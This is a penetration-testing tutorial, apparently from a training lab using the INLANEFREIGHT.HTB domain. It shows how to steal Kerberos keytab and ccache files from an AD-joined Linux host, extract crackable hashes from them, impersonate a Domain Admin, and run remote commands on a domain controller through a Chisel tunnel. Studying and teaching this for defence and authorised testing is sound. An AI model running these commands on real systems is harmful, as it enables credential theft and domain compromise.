# Pass the Ticket (PtT) from Linux

[Pass the Ticket from Linux](https://attack.mitre.org/techniques/T1550/003/) works on the same Kerberos principles as the Windows equivalent, but the credential material lives in different storage formats. On a Linux system integrated with Active Directory, Kerberos tickets are stored as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) or [keytab files](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) — both are directly abusable for lateral movement without knowing the account's password.

## Confirming AD Integration

Before hunting for credentials, confirm that the Linux machine is actually domain-joined. [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is the most direct check — it shows the domain name, authentication type, and which users and groups are permitted to log in:

```bash
realm list
```

If `realm` is absent, check for running AD integration daemons instead. The presence of [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) confirms the machine is domain-joined:

```bash
ps -ef | grep -i "winbind\|sssd"
```

## Kerberos Credential Storage on Linux

There are two distinct formats to be aware of:

| Type | Location | Purpose | Default Permissions |
|---|---|---|---|
| ccache file | `/tmp/krb5cc_<UID>_*` | Active session tickets (TGT/TGS) | Only readable by owning user |
| keytab file | `/etc/krb5.keytab`, `/opt/`, scripts | Long-lived keys for scripted auth | Varies — often misconfigured as world-readable |
| Machine keytab | `/etc/krb5.keytab` | Computer account ticket | Root only |

The environment variable `KRB5CCNAME` points to the active ccache file for the current session. Any tool supporting Kerberos authentication reads from this variable to locate credentials:

```bash
env | grep -i krb5
# Example output: KRB5CCNAME=FILE:/tmp/krb5cc_647401107_r5qiuu
```

## Finding Keytab Files

Search for files with `keytab` in the name — administrators commonly use the `.keytab` extension for clarity, though it is not mandatory:

```bash
find / -name *keytab* -ls 2>/dev/null
```

Keytab files referenced inside automated scripts are a particularly valuable find. Check cron jobs for any script invoking `kinit` with a `-k -t` argument, as that is how scripts authenticate non-interactively using a keytab:

```bash
crontab -l
# Look for lines like: kinit svc_workstations@INLANEFREIGHT.HTB -k -t /path/to/svc_workstations.kt
```

If you find a keytab in a script but it has a non-standard extension, the path to the file will be visible in the `kinit` call itself. Note that the computer account keytab at `/etc/krb5.keytab` can be used to impersonate the machine account `LINUX01$` if root access is achieved.

## Finding ccache Files

List all ccache files in `/tmp` to see which users have active authenticated sessions on the machine:

```bash
ls -la /tmp | grep krb5cc
```

The filename format is `krb5cc_<UID>_<random>`. Cross-reference UIDs with usernames to identify which accounts have live tickets. With root access, you can read any ccache file regardless of ownership. Always check ticket validity before using — a ticket past its expiration time is useless:

```bash
# Inspect a specific ccache file without importing it
klist -c /tmp/krb5cc_647401106_HRJDux
```

## Abusing Keytab Files

### Impersonating a user with kinit

First inspect the keytab to confirm which principal it contains:

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

Then import it into your current session. This replaces the TGT in your active ccache file:

```bash
# Save your current ticket first if you need to restore it later
cp $KRB5CCNAME /tmp/my_backup_ticket

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist  # Confirm the ticket changed to carlos

# Test access
smbclient //dc01/carlos -k -c ls
```

Note that `kinit` is case-sensitive. The principal name must match exactly as shown by `klist -k -t`.

### Extracting hashes from a keytab with KeyTabExtract

A keytab file stores the encrypted keys derived from the account's password. [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) pulls those keys out:

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

This outputs up to three hash types depending on what encryption types the keytab was created with:

- **NTLM hash** — directly usable for Pass the Hash attacks; the easiest to crack offline
- **AES-256 hash** — usable for OverPass the Hash / ticket forging via Rubeus `asktgt /aes256`
- **AES-128 hash** — same use as AES-256 but less preferred

Take the NTLM hash to a cracking tool like [Hashcat](https://hashcat.net/) or an online lookup at [CrackStation](https://crackstation.net/) to recover the plaintext password. Once recovered, log in directly:

```bash
su - carlos@inlanefreight.htb
```

When logged in as a new user, look for further keytab files in their home directory or scripts, and repeat the extraction process to continue pivoting.

## Abusing ccache Files

With root access, copy any ccache file and point `KRB5CCNAME` at it. The kernel does not enforce ticket ownership checks at the filesystem level beyond the file permission — once you can read it, you can use it:

```bash
# Identify high-value targets (e.g. Domain Admins)
id julio@inlanefreight.htb
# Confirm: groups=domain admins@inlanefreight.htb

# Import Julio's ccache into the current session
cp /tmp/krb5cc_647401106_HRJDux /root/
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
klist  # Confirm ticket belongs to julio

# Test DA access
smbclient //dc01/C$ -k -c ls -no-pass
```

Be aware that ccache files are temporary. They are tied to the user's session and expire based on the ticket's `EndTime` field shown by `klist`. If the user logs out or the ticket expires, the file becomes unusable.

## Using Linux Attack Tools with Kerberos

### Impacket

All Impacket tools support Kerberos authentication via the `-k` flag. Use the hostname rather than the IP address — Kerberos tickets are tied to the SPN which includes the hostname:

```bash
# From a domain-joined Linux machine (KRB5CCNAME already set)
impacket-wmiexec dc01 -k -no-pass

# From an external attack host via Proxychains (after Chisel tunnel setup)
proxychains impacket-wmiexec dc01 -k -no-pass
```

If you see a `FILE:` prefix in `KRB5CCNAME` (common on SSSD-configured machines), strip it down to just the path:

```bash
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
# Not: FILE:/root/krb5cc_647401106_I8I133
```

### Evil-WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) requires the `krb5-user` package and a correctly configured `/etc/krb5.conf` pointing to the domain's KDC before Kerberos authentication will work:

```bash
sudo apt-get install krb5-user -y
```

Configure `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Then connect using the realm flag instead of a hash or password:

```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Proxying Traffic from an External Attack Host

When attacking from a machine not joined to the domain, the attack host needs a network path to the KDC (port 88) and target services. [Chisel](https://github.com/jpillora/chisel) + [Proxychains](https://github.com/haad/proxychains) is the standard approach:

```bash
# Attack host: start Chisel in reverse server mode
sudo ./chisel server --reverse

# On MS01 (Windows pivot): connect back to attack host
chisel.exe client 10.10.14.33:8080 R:socks
```

Configure Proxychains to use the SOCKS5 tunnel:

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

Hardcode domain hostnames in `/etc/hosts` since DNS resolution will not work without a direct KDC connection:

```
172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

Then transfer the target's ccache file from the compromised Linux host, set `KRB5CCNAME`, and run Impacket or Evil-WinRM through Proxychains.

## Ticket Format Conversion

ccache files (Linux format) and .kirbi files (Windows format) are interchangeable using [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py):

```bash
# Convert ccache to kirbi (for use with Rubeus on Windows)
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Convert kirbi to ccache (for use on Linux)
impacket-ticketConverter julio.kirbi julio.ccache
```

Once converted to `.kirbi`, the ticket can be imported on a Windows machine via Rubeus and used for the same lateral movement techniques covered in the PtT from Windows section:

```cmd
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Linikatz — Automated Credential Extraction

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is the Linux equivalent of Mimikatz for Active Directory environments. It requires root and automatically extracts all credential material from every supported AD integration stack ([SSSD](https://sssd.io/), Samba, FreeIPA, Vintella, and PBIS). All output is saved to a `linikatz.*` directory with credentials in their native formats:

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
/opt/linikatz.sh
```

The output covers all credential types in one pass — ccache files for currently authenticated users, the machine account keytab at `/etc/krb5.keytab`, SSSD cached hashes, Samba secrets, and plaintext passwords from memory where available. This makes it the fastest single command to run immediately after gaining root on a domain-joined Linux machine.

## Attack Chain Reference

| Step | Goal | Command |
|---|---|---|
| 1 | Confirm domain join | `realm list` or `ps -ef \| grep sssd` |
| 2 | Find keytab files | `find / -name *keytab* -ls 2>/dev/null` |
| 3 | Find ccache files | `ls -la /tmp \| grep krb5cc` |
| 4 | Inspect keytab principal | `klist -k -t <file.keytab>` |
| 5 | Import keytab into session | `kinit USER@DOMAIN -k -t <file>` |
| 6 | Extract hashes from keytab | `python3 keytabextract.py <file>` |
| 7 | Import ccache into session | `export KRB5CCNAME=/path/to/ccache` |
| 8 | Verify active ticket | `klist` |
| 9 | Use ticket with Impacket | `impacket-wmiexec dc01 -k -no-pass` |
| 10 | Use ticket with Evil-WinRM | `evil-winrm -i dc01 -r DOMAIN` |
| 11 | Convert ccache to kirbi | `impacket-ticketConverter ticket.ccache ticket.kirbi` |
| 12 | Full automated extraction | `./linikatz.sh` (as root) |
